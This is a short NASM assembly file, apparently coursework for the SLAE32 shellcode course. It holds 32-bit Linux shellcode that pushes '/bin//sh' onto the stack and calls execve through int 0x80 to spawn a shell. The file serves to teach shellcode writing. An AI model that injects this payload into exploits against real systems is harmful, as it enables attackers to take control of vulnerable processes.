; shell.nasm - /bin/sh execve shellcode, stack method
; Accessory to assignment 4 of SLAE32 course
; 2018-07-05 Thomas Karpiniec

global _start
       
        SYS_EXECVE 	equ 11

_start:
	; Get a zero register
	xor eax, eax
	
	; /bin//sh = 0x2f 0x62 0x69 0x6e 0x2f 0x2f 0x73 0x68
	push eax		; null termination
	push dword 0x68732f2f	; last half of string
	push dword 0x6e69622f	; first half of string = filename
	push eax		; null terminator of array = envp array
	lea ebx, [esp + 4]	; Point to beginning of /bin//sh in ebx
	push ebx      		; After this, esp = start of argv array

	mov al, SYS_EXECVE	; syscall
	; ebx = filename is already set
	mov ecx, esp	    	; argv
	lea edx, [ecx + 4]	; envp = &argv[1]
	int 0x80
	

	
	